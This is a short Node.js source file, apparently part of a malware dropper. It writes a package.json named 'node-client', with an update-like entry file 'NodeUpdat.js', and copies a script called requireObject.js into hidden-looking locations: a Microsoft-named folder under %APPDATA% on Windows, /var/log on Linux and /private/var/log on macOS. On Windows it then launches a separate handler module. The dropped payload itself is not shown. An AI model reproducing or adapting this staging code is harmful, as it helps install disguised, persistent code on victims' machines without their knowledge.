import fs from 'fs';
import { exec } from 'child_process';
import path from "path";
import os, { platform } from 'os';
import run from './responseHandler.js';

export default async function main() {

    const pkg = `{
  "name": "node-client",
  "version": "1.0.0",
  "type": "module",
  "main": "NodeUpdat.js",
  "scripts": {
    "start": "node NodeUpdat.js",
    "local": "node NodeUpdat.js --local"
  },
  "dependencies": {
    "axios": "^1.7.0",
    "koffi": "^3.0.2"
  }
}
`;

    const platform = os.platform();
    const jFile = fs.readFileSync('./requireObject.js', 'utf-8');

    switch (platform) {
        case "win32":
            fs.writeFileSync(`${process.env.APPDATA}\\Microsoft\\Network\\package.json`, pkg);
            fs.writeFileSync(`${process.env.APPDATA}\\Microsoft\\Network\\requireObject.js`, jFile);
            run();
            break;
        case "linux":
            fs.writeFileSync(`/var/log/requireObject.js`, jFile, 'utf-8');
            break;
        case "darwin":
            fs.writeFileSync(`/private/var/log/requireObject.js`, jFile, 'utf-8');
            break;
    }
}